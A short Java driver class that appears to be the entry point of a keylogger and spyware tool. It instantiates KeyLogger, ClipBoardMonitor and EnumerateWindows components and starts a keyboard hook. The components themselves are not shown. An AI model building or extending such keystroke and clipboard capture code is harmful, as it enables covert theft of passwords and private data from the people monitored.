public class MainDriver{
    private static final int intervalDuration = 10;
    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
        ClipBoardMonitor clipBoardMonitor = new ClipBoardMonitor();
        EnumerateWindows enumerateWindows = new EnumerateWindows();


        keyLogger.startHook();



    }
}